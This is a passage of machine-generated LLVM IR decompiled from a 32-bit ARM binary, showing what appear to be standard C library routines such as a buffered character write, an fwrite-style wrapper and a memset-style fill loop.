  %v1_edc8 = add i32 %v0_edb8, 8
  %v2_edc8 = inttoptr i32 %v1_edc8 to i32*
  %v3_edc8 = load i32, i32* %v2_edc8, align 4
  store i32 %v3_edc8, i32* %r3.global-to-local, align 4
  %v3_edcc = icmp uge i32 %v3_edc4, %v3_edc8
  store i1 %v3_edcc, i1* %cpsr_c.global-to-local, align 1
  %v9_edcc = icmp eq i32 %v3_edc4, %v3_edc8
  br i1 %v9_edcc, label %dec_label_pc_ee38, label %dec_label_pc_edd4

dec_label_pc_edd4:                                ; preds = %dec_label_pc_edc4
  %v1_edd4 = add i32 %v0_edb8, 16
  %v2_edd4 = inttoptr i32 %v1_edd4 to i32*
  %v3_edd4 = load i32, i32* %v2_edd4, align 4
  store i32 %v3_edd4, i32* %r3.global-to-local, align 4
  %v3_edd8 = icmp uge i32 %v3_edc4, %v3_edd4
  store i1 %v3_edd8, i1* %cpsr_c.global-to-local, align 1
  %v9_edd8 = icmp eq i32 %v3_edc4, %v3_edd4
  br i1 %v9_edd8, label %dec_label_pc_ede0, label %dec_label_pc_edf0

dec_label_pc_ede0:                                ; preds = %dec_label_pc_edd4
  store i32 %v0_edb8, i32* @r0, align 4
  %v0_ede4 = call i32 @function_d8c8()
  store i32 %v0_ede4, i32* %r0.global-to-local, align 4
  store i1 true, i1* %cpsr_c.global-to-local, align 1
  %v2_ede8 = icmp eq i32 %v0_ede4, 0
  br i1 %v2_ede8, label %dec_label_pc_ede0.dec_label_pc_edf0_crit_edge, label %dec_label_pc_ee5c

dec_label_pc_ede0.dec_label_pc_edf0_crit_edge:    ; preds = %dec_label_pc_ede0
  %v0_edf0.pre = load i32, i32* @r4, align 4
  br label %dec_label_pc_edf0

dec_label_pc_edf0:                                ; preds = %dec_label_pc_ede0.dec_label_pc_edf0_crit_edge, %dec_label_pc_edd4
  %v0_edf0 = phi i32 [ %v0_edf0.pre, %dec_label_pc_ede0.dec_label_pc_edf0_crit_edge ], [ %v0_edb8, %dec_label_pc_edd4 ]
  %v1_edf0 = add i32 %v0_edf0, 16
  %v2_edf0 = inttoptr i32 %v1_edf0 to i32*
  %v3_edf0 = load i32, i32* %v2_edf0, align 4
  store i32 %v3_edf0, i32* %r2.global-to-local, align 4
  %v0_edf4 = load i32, i32* @r5, align 4
  %v1_edf4 = urem i32 %v0_edf4, 256
  store i32 %v1_edf4, i32* %r1.global-to-local, align 4
  %v1_edf8 = trunc i32 %v0_edf4 to i8
  %v3_edf8 = inttoptr i32 %v3_edf0 to i8*
  store i8 %v1_edf8, i8* %v3_edf8, align 1
  %v4_edf8 = load i32, i32* %r2.global-to-local, align 4
  %v5_edf8 = add i32 %v4_edf8, 1
  store i32 %v5_edf8, i32* %r2.global-to-local, align 4
  %v0_edfc = load i32, i32* @r4, align 4
  %v1_edfc = add i32 %v0_edfc, 1
  %v2_edfc = inttoptr i32 %v1_edfc to i8*
  %v3_edfc = load i8, i8* %v2_edfc, align 1
  %v4_edfc = zext i8 %v3_edfc to i32
  store i32 %v4_edfc, i32* %r3.global-to-local, align 4
  %tmp12 = urem i8 %v3_edfc, 2
  %v2_ee00 = icmp eq i8 %tmp12, 0
  %v2_ee04 = add i32 %v0_edfc, 16
  %v3_ee04 = inttoptr i32 %v2_ee04 to i32*
  store i32 %v5_edf8, i32* %v3_ee04, align 4
  br i1 %v2_ee00, label %dec_label_pc_ee54, label %dec_label_pc_ee0c

dec_label_pc_ee0c:                                ; preds = %dec_label_pc_edf0
  %v0_ee0c = load i32, i32* %r1.global-to-local, align 4
  %v2_ee0c = icmp ugt i32 %v0_ee0c, 9
  store i1 %v2_ee0c, i1* %cpsr_c.global-to-local, align 1
  %v7_ee0c = icmp eq i32 %v0_ee0c, 10
  br i1 %v7_ee0c, label %dec_label_pc_ee14, label %dec_label_pc_ee54

dec_label_pc_ee14:                                ; preds = %dec_label_pc_ee0c
  %v0_ee14 = load i32, i32* @r4, align 4
  store i32 %v0_ee14, i32* @r0, align 4
  %v0_ee18 = call i32 @function_d8c8()
  store i32 %v0_ee18, i32* %r0.global-to-local, align 4
  store i1 true, i1* %cpsr_c.global-to-local, align 1
  %v2_ee1c = icmp eq i32 %v0_ee18, 0
  br i1 %v2_ee1c, label %dec_label_pc_ee54, label %dec_label_pc_ee24

dec_label_pc_ee24:                                ; preds = %dec_label_pc_ee14
  %v0_ee24 = load i32, i32* @r4, align 4
  %v1_ee24 = add i32 %v0_ee24, 16
  %v2_ee24 = inttoptr i32 %v1_ee24 to i32*
  %v3_ee24 = load i32, i32* %v2_ee24, align 4
  store i32 -1, i32* %r0.global-to-local, align 4
  %v1_ee2c = add i32 %v3_ee24, -1
  store i32 %v1_ee2c, i32* %r3.global-to-local, align 4
  store i32 %v1_ee2c, i32* %v2_ee24, align 4
  br label %dec_label_pc_ee60

dec_label_pc_ee38:                                ; preds = %dec_label_pc_edc4
  %v0_ee3c = load i32, i32* @r5, align 4
  %v6_ee3c = trunc i32 %v0_ee3c to i8
  store i8 %v6_ee3c, i8* %stack_var_-13, align 1
  %v9_ee3c = ptrtoint i8* %stack_var_-13 to i32
  store i32 %v9_ee3c, i32* %r1.global-to-local, align 4
  %v1_ee40 = inttoptr i32 %v0_edb8 to i8*
  store i32 %v0_edb8, i32* %r0.global-to-local, align 4
  store i32 1, i32* %r2.global-to-local, align 4
  %v5_ee48 = call i32 @function_11684(i8* %v1_ee40, i32 %v9_ee3c, i32 1)
  store i32 %v5_ee48, i32* %r0.global-to-local, align 4
  store i1 true, i1* %cpsr_c.global-to-local, align 1
  %v2_ee4c = icmp eq i32 %v5_ee48, 0
  br i1 %v2_ee4c, label %dec_label_pc_ee5c, label %dec_label_pc_ee54

dec_label_pc_ee54:                                ; preds = %dec_label_pc_ee0c, %dec_label_pc_ee38, %dec_label_pc_ee14, %dec_label_pc_edf0, %dec_label_pc_edb8
  %v0_ee54 = load i32, i32* @r5, align 4
  %v1_ee54 = urem i32 %v0_ee54, 256
  store i32 %v1_ee54, i32* %r0.global-to-local, align 4
  br label %dec_label_pc_ee60

dec_label_pc_ee5c:                                ; preds = %dec_label_pc_ede0, %dec_label_pc_eda4, %dec_label_pc_ee38
  store i32 -1, i32* %r0.global-to-local, align 4
  br label %dec_label_pc_ee60

dec_label_pc_ee60:                                ; preds = %.thread2, %dec_label_pc_ee54, %dec_label_pc_ee24, %dec_label_pc_ee5c
  %v2_ee64 = load i32, i32* %stack_var_-12, align 4
  store i32 %v2_ee64, i32* @r4, align 4
  store i32 %v6_ed64, i32* @r5, align 4
  %v11_ee64 = load i32, i32* %r0.global-to-local, align 4
  ret i32 %v11_ee64

; uselistorder directives
  uselistorder i32 %v0_ee0c, { 1, 0 }
  uselistorder i32 %v0_edf4, { 1, 0 }
  uselistorder i32 %v0_edb8, { 0, 1, 2, 3, 4, 6, 5, 7 }
  uselistorder i32 %v0_ed7c, { 1, 0, 2 }
  uselistorder i32* %r1.global-to-local, { 1, 2, 3, 4, 0 }
  uselistorder i32* %r0.global-to-local, { 9, 2, 3, 12, 4, 5, 6, 7, 11, 8, 10, 0, 1 }
  uselistorder i32 %arg2, { 0, 1, 2, 3, 5, 4 }
  uselistorder label %dec_label_pc_ee60, { 3, 1, 2, 0 }
  uselistorder label %dec_label_pc_ee5c, { 2, 0, 1 }
  uselistorder label %dec_label_pc_ee54, { 1, 2, 0, 3, 4 }
  uselistorder label %dec_label_pc_ed94, { 1, 0 }
}

define i32 @function_ee68(i32 %arg1, i32 %arg2) local_unnamed_addr {
dec_label_pc_ee68:
  store i32 %arg1, i32* @r0, align 4
  %stack_var_-16 = alloca i32, align 4
  %v3_ee68 = load i32, i32* @r4, align 4
  store i32 %v3_ee68, i32* %stack_var_-16, align 4
  %v6_ee68 = load i32, i32* @r5, align 4
  %v9_ee68 = load i32, i32* @r6, align 4
  store i32 %arg2, i32* @r5, align 4
  store i32 %arg1, i32* @r4, align 4
  %v0_ee74 = call i32 @function_f030()
  store i32 %v0_ee74, i32* @r6, align 4
  %v0_ee7c = load i32, i32* @r5, align 4
  %v0_ee80 = load i32, i32* @r4, align 4
  %v4_ee8c = inttoptr i32 %v0_ee7c to i8*
  %v5_ee8c = call i32 @function_ee9c(i32 %v0_ee80, i32 1, i32 %v0_ee74, i8* %v4_ee8c)
  %v1_ee90 = load i32, i32* @r6, align 4
  %v9_ee90 = icmp eq i32 %v5_ee8c, %v1_ee90
  br i1 %v9_ee90, label %bb6, label %bb

bb:                                               ; preds = %dec_label_pc_ee68
  br label %bb6

bb6:                                              ; preds = %dec_label_pc_ee68, %bb
  %v14_ee98 = phi i32 [ %v5_ee8c, %dec_label_pc_ee68 ], [ -1, %bb ]
  %v2_ee98 = load i32, i32* %stack_var_-16, align 4
  store i32 %v2_ee98, i32* @r4, align 4
  store i32 %v6_ee68, i32* @r5, align 4
  store i32 %v9_ee68, i32* @r6, align 4
  ret i32 %v14_ee98

; uselistorder directives
  uselistorder label %bb6, { 1, 0 }
}

define i32 @function_ee9c(i32 %arg1, i32 %arg2, i32 %arg3, i8* %arg4) local_unnamed_addr {
dec_label_pc_ee9c:
  %r2.global-to-local = alloca i32, align 4
  %r3.global-to-local = alloca i32, align 4
  %tmp = ptrtoint i8* %arg4 to i32
  store i32 %tmp, i32* %r3.global-to-local, align 4
  store i32 %arg3, i32* %r2.global-to-local, align 4
  %v9_ee9c = load i32, i32* @r6, align 4
  %v12_ee9c = load i32, i32* @r7, align 4
  store i32 %tmp, i32* @r4, align 4
  %v3_eea4 = load i8, i8* %arg4, align 1
  %v4_eea4 = zext i8 %v3_eea4 to i32
  %v1_eea8 = and i32 %v4_eea4, 192
  store i32 %v1_eea8, i32* %r3.global-to-local, align 4
  %v2_eeac = icmp eq i32 %v1_eea8, 192
  store i32 %arg2, i32* @r5, align 4
  store i32 %arg1, i32* @r7, align 4
  store i32 %arg3, i32* @r6, align 4
  br i1 %v2_eeac, label %dec_label_pc_eed4, label %dec_label_pc_eec8

dec_label_pc_eec8:                                ; preds = %dec_label_pc_ee9c
  %v4_eec8 = call i32 @function_11878(i8* nonnull %arg4, i32 128)
  %v2_eecc = icmp eq i32 %v4_eec8, 0
  br i1 %v2_eecc, label %dec_label_pc_eec8.dec_label_pc_eed4_crit_edge, label %dec_label_pc_ef3c

dec_label_pc_eec8.dec_label_pc_eed4_crit_edge:    ; preds = %dec_label_pc_eec8
  %v0_eed4.pre = load i32, i32* @r5, align 4
  br label %dec_label_pc_eed4

dec_label_pc_eed4:                                ; preds = %dec_label_pc_eec8.dec_label_pc_eed4_crit_edge, %dec_label_pc_ee9c
  %v0_eedc1 = phi i32 [ %v0_eed4.pre, %dec_label_pc_eec8.dec_label_pc_eed4_crit_edge ], [ %arg2, %dec_label_pc_ee9c ]
  %v2_eed4 = icmp eq i32 %v0_eedc1, 0
  br i1 %v2_eed4, label %.thread, label %bb

.thread:                                          ; preds = %dec_label_pc_eed4
  br label %dec_label_pc_ef3c

bb:                                               ; preds = %dec_label_pc_eed4
  %v1_eed8 = load i32, i32* @r6, align 4
  %v3_eed8 = icmp eq i32 %v1_eed8, 0
  store i32 %v0_eedc1, i32* @r1, align 4
  store i32 -1, i32* @r0, align 4
  br i1 %v3_eed8, label %dec_label_pc_ef3c, label %dec_label_pc_eee8

dec_label_pc_eee8:                                ; preds = %bb
  %v0_eee8 = call i32 @function_14f20()
  %v0_eeec = load i32, i32* @r6, align 4
  %v0_eef0 = load i32, i32* @r4, align 4
  store i32 %v0_eef0, i32* %r2.global-to-local, align 4
  %tmp10 = icmp ugt i32 %v0_eeec, %v0_eee8
  br i1 %tmp10, label %dec_label_pc_ef14, label %dec_label_pc_eefc

dec_label_pc_eefc:                                ; preds = %dec_label_pc_eee8
  %v0_eef4 = load i32, i32* @r7, align 4
  %v1_eefc = load i32, i32* @r5, align 4
  %v2_eefc = mul i32 %v1_eefc, %v0_eeec
  %v4_ef00 = call i32 @function_11740(i32 %v0_eef4, i32 %v2_eefc, i32 %v0_eef0)
  store i32 %v4_ef00, i32* @r0, align 4
  %v0_ef04 = load i32, i32* @r5, align 4
  store i32 %v0_ef04, i32* @r1, align 4
  %v0_ef08 = call i32 @function_14f20()
  store i32 %v0_ef08, i32* %r2.global-to-local, align 4
  br label %dec_label_pc_ef40

dec_label_pc_ef14:                                ; preds = %dec_label_pc_eee8
  %v1_ef14 = inttoptr i32 %v0_eef0 to i32*
  %v2_ef14 = load i32, i32* %v1_ef14, align 4
  %v1_ef18 = or i32 %v2_ef14, 8
  store i32 %v1_ef18, i32* %r3.global-to-local, align 4
  %v3_ef1c = sdiv i32 %v2_ef14, 256
  store i32 %v3_ef1c, i32* %r2.global-to-local, align 4
  %v1_ef20 = trunc i32 %v3_ef1c to i8
  %v3_ef20 = add i32 %v0_eef0, 1
  %v4_ef20 = inttoptr i32 %v3_ef20 to i8*
  store i8 %v1_ef20, i8* %v4_ef20, align 1
  %v0_ef24 = load i32, i32* %r3.global-to-local, align 4
  %v1_ef24 = trunc i32 %v0_ef24 to i8
  %v2_ef24 = load i32, i32* @r4, align 4
  %v3_ef24 = inttoptr i32 %v2_ef24 to i8*
  store i8 %v1_ef24, i8* %v3_ef24, align 1
  %v0_ef28 = call i32 @function_cec4()
  store i32 22, i32* %r3.global-to-local, align 4
  store i32 0, i32* %r2.global-to-local, align 4
  %v2_ef34 = inttoptr i32 %v0_ef28 to i32*
  store i32 22, i32* %v2_ef34, align 4
  %v0_ef40.pre = load i32, i32* %r2.global-to-local, align 4
  br label %dec_label_pc_ef40

dec_label_pc_ef3c:                                ; preds = %.thread, %dec_label_pc_eec8, %bb
  store i32 0, i32* %r2.global-to-local, align 4
  br label %dec_label_pc_ef40

dec_label_pc_ef40:                                ; preds = %dec_label_pc_ef14, %dec_label_pc_eefc, %dec_label_pc_ef3c
  %v0_ef40 = phi i32 [ %v0_ef40.pre, %dec_label_pc_ef14 ], [ %v0_ef08, %dec_label_pc_eefc ], [ 0, %dec_label_pc_ef3c ]
  store i32 %v9_ee9c, i32* @r6, align 4
  store i32 %v12_ee9c, i32* @r7, align 4
  ret i32 %v0_ef40

; uselistorder directives
  uselistorder i32 %v3_ef1c, { 1, 0 }
  uselistorder i32 %v0_eeec, { 1, 0 }
  uselistorder i32* %r3.global-to-local, { 1, 2, 3, 4, 0 }
  uselistorder i32* %r2.global-to-local, { 1, 2, 3, 4, 5, 6, 0 }
  uselistorder i32 (i32, i32, i32)* @function_11740, { 3, 2, 1, 0 }
  uselistorder i32 (i8*, i32)* @function_11878, { 1, 0 }
  uselistorder label %dec_label_pc_ef40, { 2, 0, 1 }
  uselistorder label %dec_label_pc_ef3c, { 2, 0, 1 }
}

define i32 @function_ef48(i32 %arg1) local_unnamed_addr {
dec_label_pc_ef48:
  ret i32 %arg1
}

define i32 @function_ef50(i32 %arg1, i32 %arg2, i32 %arg3) local_unnamed_addr {
dec_label_pc_ef50:
  %v2_ef5c = inttoptr i32 %arg2 to i8*
  %v3_ef5c = call i32 @function_124a0(i8* %v2_ef5c, i32 %arg1)
  ret i32 %v3_ef5c
}

define i32 @function_ef60() local_unnamed_addr {
dec_label_pc_ef60:
  %v0_ef60 = load i32, i32* @r0, align 4
  %v1_ef60 = load i32, i32* @r1, align 4
  %v2_ef60 = inttoptr i32 %v0_ef60 to i8*
  %v3_ef60 = call i32 @function_124a0(i8* %v2_ef60, i32 %v1_ef60)
  ret i32 %v3_ef60
}

define i32 @function_ef70(i8* %arg1, i32 %arg2) local_unnamed_addr {
dec_label_pc_ef70:
  %cpsr_z.global-to-local = alloca i1, align 1
  %r1.global-to-local = alloca i32, align 4
  %r2.global-to-local = alloca i32, align 4
  %r3.global-to-local = alloca i32, align 4
  store i32 %arg2, i32* %r1.global-to-local, align 4
  %tmp = ptrtoint i8* %arg1 to i32
  store i32 %tmp, i32* %r3.global-to-local, align 4
  %v0_ef74 = load i32, i32* @r2, align 4
  %v8_ef74 = icmp eq i32 %v0_ef74, 8
  store i1 %v8_ef74, i1* %cpsr_z.global-to-local, align 1
  %v5_ef78 = icmp slt i32 %v0_ef74, 8
  br i1 %v5_ef78, label %dec_label_pc_efd8, label %dec_label_pc_ef7c

dec_label_pc_ef7c:                                ; preds = %dec_label_pc_ef70
  %v4_ef7c = mul i32 %arg2, 256
  %v5_ef7c = or i32 %v4_ef7c, %arg2
  %v4_ef80 = mul i32 %v5_ef7c, 65536
  %v5_ef80 = or i32 %v4_ef80, %v5_ef7c
  store i32 %v5_ef80, i32* %r1.global-to-local, align 4
  %v1_ef8457 = urem i32 %tmp, 4
  %v2_ef8458 = icmp eq i32 %v1_ef8457, 0
  store i1 %v2_ef8458, i1* %cpsr_z.global-to-local, align 1
  %extract.t83 = trunc i32 %arg2 to i8
  br i1 %v2_ef8458, label %dec_label_pc_ef94, label %bb

bb:                                               ; preds = %dec_label_pc_ef7c, %.thread.bb_crit_edge
  %arg2.sink.off0 = phi i8 [ %extract.t82, %.thread.bb_crit_edge ], [ %extract.t83, %dec_label_pc_ef7c ]
  %v3_ef8859 = phi i32 [ %v6_ef88, %.thread.bb_crit_edge ], [ %tmp, %dec_label_pc_ef7c ]
  %v4_ef88 = inttoptr i32 %v3_ef8859 to i8*
  store i8 %arg2.sink.off0, i8* %v4_ef88, align 1
  %v5_ef88 = load i32, i32* %r3.global-to-local, align 4
  %v6_ef88 = add i32 %v5_ef88, 1
  store i32 %v6_ef88, i32* %r3.global-to-local, align 4
  %v0_ef8c.pr = load i1, i1* %cpsr_z.global-to-local, align 1
  %v0_ef98.pr.pre = load i32, i32* @r2, align 4
  br i1 %v0_ef8c.pr, label %dec_label_pc_ef94, label %.thread

.thread:                                          ; preds = %bb
  %v2_ef8c = add i32 %v0_ef98.pr.pre, -1
  store i32 %v2_ef8c, i32* @r2, align 4
  %v1_ef84 = urem i32 %v6_ef88, 4
  %v2_ef84 = icmp eq i32 %v1_ef84, 0
  store i1 %v2_ef84, i1* %cpsr_z.global-to-local, align 1
  br i1 %v2_ef84, label %dec_label_pc_ef94, label %.thread.bb_crit_edge

.thread.bb_crit_edge:                             ; preds = %.thread
  %v1_ef88.pre = load i32, i32* %r1.global-to-local, align 4
  %extract.t82 = trunc i32 %v1_ef88.pre to i8
  br label %bb

dec_label_pc_ef94:                                ; preds = %.thread, %bb, %dec_label_pc_ef7c
  %v0_efa028 = phi i32 [ %tmp, %dec_label_pc_ef7c ], [ %v6_ef88, %bb ], [ %v6_ef88, %.thread ]
  %v0_ef98.pr = phi i32 [ %v0_ef74, %dec_label_pc_ef7c ], [ %v0_ef98.pr.pre, %bb ], [ %v2_ef8c, %.thread ]
  %v0_ef94 = load i32, i32* %r1.global-to-local, align 4
  store i32 %v0_ef94, i32* @ip, align 4
  %v8_ef9810 = icmp eq i32 %v0_ef98.pr, 8
  store i1 %v8_ef9810, i1* %cpsr_z.global-to-local, align 1
  %v5_ef9c11 = icmp slt i32 %v0_ef98.pr, 8
  br i1 %v5_ef9c11, label %dec_label_pc_efd8, label %dec_label_pc_efa0.preheader

dec_label_pc_efa0.preheader:                      ; preds = %dec_label_pc_ef94
  %v1_efa046 = inttoptr i32 %v0_efa028 to i32*
  store i32 %v0_ef94, i32* %v1_efa046, align 4
  %v3_efa047 = add i32 %v0_efa028, 4
  %v4_efa048 = inttoptr i32 %v3_efa047 to i32*
  %v5_efa049 = load i32, i32* @ip, align 4
  store i32 %v5_efa049, i32* %v4_efa048, align 4
  %v6_efa050 = add i32 %v0_efa028, 8
  store i32 %v6_efa050, i32* %r3.global-to-local, align 4
  %v0_efa451 = load i32, i32* @r2, align 4
  %v1_efa452 = add i32 %v0_efa451, -8
  store i32 %v1_efa452, i32* %r2.global-to-local, align 4
  %v5_efac53 = icmp slt i32 %v1_efa452, 8
  br i1 %v5_efac53, label %dec_label_pc_efa0.dec_label_pc_efd8.loopexit_crit_edge, label %dec_label_pc_efb0

dec_label_pc_efb0:                                ; preds = %dec_label_pc_efa0.preheader, %dec_label_pc_ef98.dec_label_pc_efa0_crit_edge
  %v6_efa055 = phi i32 [ %v6_efa0, %dec_label_pc_ef98.dec_label_pc_efa0_crit_edge ], [ %v6_efa050, %dec_label_pc_efa0.preheader ]
  %v0_efa054 = phi i32 [ %v12_efcc, %dec_label_pc_ef98.dec_label_pc_efa0_crit_edge ], [ %v0_efa028, %dec_label_pc_efa0.preheader ]
  %v1_efb0 = inttoptr i32 %v6_efa055 to i32*
  %v2_efb0 = load i32, i32* %r1.global-to-local, align 4
  store i32 %v2_efb0, i32* %v1_efb0, align 4
  %v3_efb0 = add i32 %v0_efa054, 12
  %v4_efb0 = inttoptr i32 %v3_efb0 to i32*
  %v5_efb0 = load i32, i32* @ip, align 4
  store i32 %v5_efb0, i32* %v4_efb0, align 4
  %v6_efb0 = add i32 %v0_efa054, 16
  store i32 %v6_efb0, i32* %r3.global-to-local, align 4
  %v0_efb4 = load i32, i32* %r2.global-to-local, align 4
  %v1_efb4 = add i32 %v0_efb4, -8
  store i32 %v1_efb4, i32* %r2.global-to-local, align 4
  %v5_efbc = icmp slt i32 %v1_efb4, 8
  br i1 %v5_efbc, label %dec_label_pc_efb0.dec_label_pc_efd8.loopexit_crit_edge, label %dec_label_pc_efc0

dec_label_pc_efc0:                                ; preds = %dec_label_pc_efb0
  %v1_efc0 = inttoptr i32 %v6_efb0 to i32*
  %v2_efc0 = load i32, i32* %r1.global-to-local, align 4
  store i32 %v2_efc0, i32* %v1_efc0, align 4
  %v3_efc0 = add i32 %v0_efa054, 20
  %v4_efc0 = inttoptr i32 %v3_efc0 to i32*
  %v5_efc0 = load i32, i32* @ip, align 4
  store i32 %v5_efc0, i32* %v4_efc0, align 4
  %v6_efc0 = add i32 %v0_efa054, 24
  store i32 %v6_efc0, i32* %r3.global-to-local, align 4
  %v0_efc4 = load i32, i32* %r2.global-to-local, align 4
  %v1_efc4 = add i32 %v0_efc4, -8
  store i32 %v1_efc4, i32* %r2.global-to-local, align 4
  %v5_efcc = icmp slt i32 %v1_efc4, 8
  br i1 %v5_efcc, label %dec_label_pc_efc0.dec_label_pc_efd8.loopexit_crit_edge, label %dec_label_pc_ef98

dec_label_pc_ef98:                                ; preds = %dec_label_pc_efc0
  %v7_efcc = inttoptr i32 %v6_efc0 to i32*
  %v8_efcc = load i32, i32* %r1.global-to-local, align 4
  store i32 %v8_efcc, i32* %v7_efcc, align 4
  %v9_efcc = add i32 %v0_efa054, 28
  %v10_efcc = inttoptr i32 %v9_efcc to i32*
  %v11_efcc = load i32, i32* @ip, align 4
  store i32 %v11_efcc, i32* %v10_efcc, align 4
  %v12_efcc = add i32 %v0_efa054, 32
  store i32 %v12_efcc, i32* %r3.global-to-local, align 4
  %v6_efd0 = load i32, i32* %r2.global-to-local, align 4
  %v7_efd0 = add i32 %v6_efd0, -8
  store i32 %v7_efd0, i32* %r2.global-to-local, align 4
  %v5_ef9c = icmp slt i32 %v7_efd0, 8
  br i1 %v5_ef9c, label %dec_label_pc_ef98.dec_label_pc_efd8.loopexit_crit_edge, label %dec_label_pc_ef98.dec_label_pc_efa0_crit_edge

dec_label_pc_ef98.dec_label_pc_efa0_crit_edge:    ; preds = %dec_label_pc_ef98
  %v2_efa0.pre = load i32, i32* %r1.global-to-local, align 4
  %v1_efa0 = inttoptr i32 %v12_efcc to i32*
  store i32 %v2_efa0.pre, i32* %v1_efa0, align 4
  %v3_efa0 = add i32 %v0_efa054, 36
  %v4_efa0 = inttoptr i32 %v3_efa0 to i32*
  %v5_efa0 = load i32, i32* @ip, align 4
  store i32 %v5_efa0, i32* %v4_efa0, align 4
  %v6_efa0 = add i32 %v0_efa054, 40
  store i32 %v6_efa0, i32* %r3.global-to-local, align 4
  %v0_efa4 = load i32, i32* %r2.global-to-local, align 4
  %v1_efa4 = add i32 %v0_efa4, -8
  store i32 %v1_efa4, i32* %r2.global-to-local, align 4
  %v5_efac = icmp slt i32 %v1_efa4, 8
  br i1 %v5_efac, label %dec_label_pc_efa0.dec_label_pc_efd8.loopexit_crit_edge, label %dec_label_pc_efb0

dec_label_pc_efa0.dec_label_pc_efd8.loopexit_crit_edge: ; preds = %dec_label_pc_ef98.dec_label_pc_efa0_crit_edge, %dec_label_pc_efa0.preheader
  %v1_efa4.lcssa = phi i32 [ %v1_efa452, %dec_label_pc_efa0.preheader ], [ %v1_efa4, %dec_label_pc_ef98.dec_label_pc_efa0_crit_edge ]
  store i1 false, i1* %cpsr_z.global-to-local, align 1
  br label %dec_label_pc_efd8

dec_label_pc_ef98.dec_label_pc_efd8.loopexit_crit_edge: ; preds = %dec_label_pc_ef98
  store i1 false, i1* %cpsr_z.global-to-local, align 1
  br label %dec_label_pc_efd8

dec_label_pc_efb0.dec_label_pc_efd8.loopexit_crit_edge: ; preds = %dec_label_pc_efb0
  store i1 false, i1* %cpsr_z.global-to-local, align 1
  br label %dec_label_pc_efd8

dec_label_pc_efc0.dec_label_pc_efd8.loopexit_crit_edge: ; preds = %dec_label_pc_efc0
  store i1 false, i1* %cpsr_z.global-to-local, align 1
  br label %dec_label_pc_efd8

dec_label_pc_efd8:                                ; preds = %dec_label_pc_ef94, %dec_label_pc_efa0.dec_label_pc_efd8.loopexit_crit_edge, %dec_label_pc_ef98.dec_label_pc_efd8.loopexit_crit_edge, %dec_label_pc_efb0.dec_label_pc_efd8.loopexit_crit_edge, %dec_label_pc_efc0.dec_label_pc_efd8.loopexit_crit_edge, %dec_label_pc_ef70
  %v0_efe0 = phi i32 [ %v0_ef74, %dec_label_pc_ef70 ], [ %v1_efc4, %dec_label_pc_efc0.dec_label_pc_efd8.loopexit_crit_edge ], [ %v1_efb4, %dec_label_pc_efb0.dec_label_pc_efd8.loopexit_crit_edge ], [ %v7_efd0, %dec_label_pc_ef98.dec_label_pc_efd8.loopexit_crit_edge ], [ %v1_efa4.lcssa, %dec_label_pc_efa0.dec_label_pc_efd8.loopexit_crit_edge ], [ %v0_ef98.pr, %dec_label_pc_ef94 ]
  %v2_efd8 = icmp eq i32 %v0_efe0, 0
  store i1 %v2_efd8, i1* %cpsr_z.global-to-local, align 1
  br i1 %v2_efd8, label %bb32, label %bb33

bb32:                                             ; preds = %dec_label_pc_efd8
  ret i32 %tmp

bb33:                                             ; preds = %dec_label_pc_efd8
  %v1_efe0 = sub i32 7, %v0_efe0
  store i32 %v1_efe0, i32* %r2.global-to-local, align 4
  %v3_efe4 = mul i32 %v1_efe0, 4
  %v4_efe4 = add i32 %v3_efe4, ptrtoint (i32* @global_var_efec.411 to i32)
  call void @__pseudo_branch(i32 %v4_efe4)
  %v0_efec = load i32, i32* %r1.global-to-local, align 4
  %v1_efec = trunc i32 %v0_efec to i8
  %v2_efec = load i32, i32* %r3.global-to-local, align 4
  %v3_efec = inttoptr i32 %v2_efec to i8*
  store i8 %v1_efec, i8* %v3_efec, align 1
  %v4_efec = load i32, i32* %r3.global-to-local, align 4
  %v5_efec = add i32 %v4_efec, 1
  store i32 %v5_efec, i32* %r3.global-to-local, align 4
  %v0_eff0 = load i32, i32* %r1.global-to-local, align 4
  %v1_eff0 = trunc i32 %v0_eff0 to i8
  %v3_eff0 = inttoptr i32 %v5_efec to i8*
  store i8 %v1_eff0, i8* %v3_eff0, align 1
  %v4_eff0 = load i32, i32* %r3.global-to-local, align 4
  %v5_eff0 = add i32 %v4_eff0, 1
  store i32 %v5_eff0, i32* %r3.global-to-local, align 4
  %v0_eff4 = load i32, i32* %r1.global-to-local, align 4
  %v1_eff4 = trunc i32 %v0_eff4 to i8
  %v3_eff4 = inttoptr i32 %v5_eff0 to i8*
  store i8 %v1_eff4, i8* %v3_eff4, align 1
  %v4_eff4 = load i32, i32* %r3.global-to-local, align 4
  %v5_eff4 = add i32 %v4_eff4, 1
  store i32 %v5_eff4, i32* %r3.global-to-local, align 4
  %v0_eff8 = load i32, i32* %r1.global-to-local, align 4
  %v1_eff8 = trunc i32 %v0_eff8 to i8
  %v3_eff8 = inttoptr i32 %v5_eff4 to i8*
  store i8 %v1_eff8, i8* %v3_eff8, align 1
  %v4_eff8 = load i32, i32* %r3.global-to-local, align 4
  %v5_eff8 = add i32 %v4_eff8, 1
  store i32 %v5_eff8, i32* %r3.global-to-local, align 4
  %v0_effc = load i32, i32* %r1.global-to-local, align 4
  %v1_effc = trunc i32 %v0_effc to i8
  %v3_effc = inttoptr i32 %v5_eff8 to i8*
  store i8 %v1_effc, i8* %v3_effc, align 1
  %v4_effc = load i32, i32* %r3.global-to-local, align 4
  %v5_effc = add i32 %v4_effc, 1
  store i32 %v5_effc, i32* %r3.global-to-local, align 4
  %v0_f000 = load i32, i32* %r1.global-to-local, align 4
  %v1_f000 = trunc i32 %v0_f000 to i8
  %v3_f000 = inttoptr i32 %v5_effc to i8*
  store i8 %v1_f000, i8* %v3_f000, align 1
  %v4_f000 = load i32, i32* %r3.global-to-local, align 4
  %v5_f000 = add i32 %v4_f000, 1
  store i32 %v5_f000, i32* %r3.global-to-local, align 4
  %v0_f004 = load i32, i32* %r1.global-to-local, align 4
  %v1_f004 = trunc i32 %v0_f004 to i8
  %v3_f004 = inttoptr i32 %v5_f000 to i8*
  store i8 %v1_f004, i8* %v3_f004, align 1
  %v4_f004 = load i32, i32* %r3.global-to-local, align 4
  %v5_f004 = add i32 %v4_f004, 1
  store i32 %v5_f004, i32* %r3.global-to-local, align 4
  ret i32 %tmp

; uselistorder directives
  uselistorder i32 %v6_efa0, { 1, 0 }
  uselistorder i32 %v12_efcc, { 1, 2, 0 }
  uselistorder i32 %v0_efa054, { 0, 1, 7, 6, 5, 4, 3, 2 }
  uselistorder i32 %v0_ef98.pr, { 0, 2, 1 }
  uselistorder i32 %v6_ef88, { 2, 3, 0, 4, 1 }
  uselistorder i32 %v5_ef7c, { 1, 0 }
